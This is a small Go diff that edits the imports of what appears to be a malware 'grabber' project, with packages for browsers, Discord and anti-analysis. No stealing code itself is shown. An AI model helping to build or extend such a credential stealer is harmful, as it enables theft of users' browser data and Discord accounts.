@@ -5,14 +5,10 @@ import (
 	"fmt"
 	"os"
 	"time"
-
 	"kdot/grabber/browsers"
 	"kdot/grabber/discord"
-	"kdot/grabber/screenshot"
-
 	"kdot/grabber/anti"
-
-	_ "github.com/mattn/go-sqlite3"
+       "github.com/mattn/go-sqlite3"
 )
 
 func main() {
